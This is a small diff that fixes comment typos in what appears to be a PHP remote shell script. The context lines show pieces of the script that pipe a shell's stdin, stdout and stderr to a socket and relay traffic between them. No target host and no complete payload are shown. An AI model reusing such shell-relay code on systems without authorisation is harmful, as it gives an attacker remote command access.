@@ -27,7 +27,7 @@
     (
         0 => array( "pipe", "r" ),  #stdin
         1 => array( "pipe", "w" ),  #stdout
-        2 => array( "pipe", "w" )   #sterr
+        2 => array( "pipe", "w" )   #stderr
     );
 
     // get a shell
@@ -67,7 +67,7 @@
 
         // keeps track of the state of stdin, stdout, and stderr
         $traffic = array($socket, $pipes[1], $pipes[2]);
-        // dumby variables because we only care aboout traffic
+        // dumby variables because we only care about traffic
         $write = null; $except = null;
         // wait for traffic
         $changedStreams = stream_select($traffic,$write,$except,null);
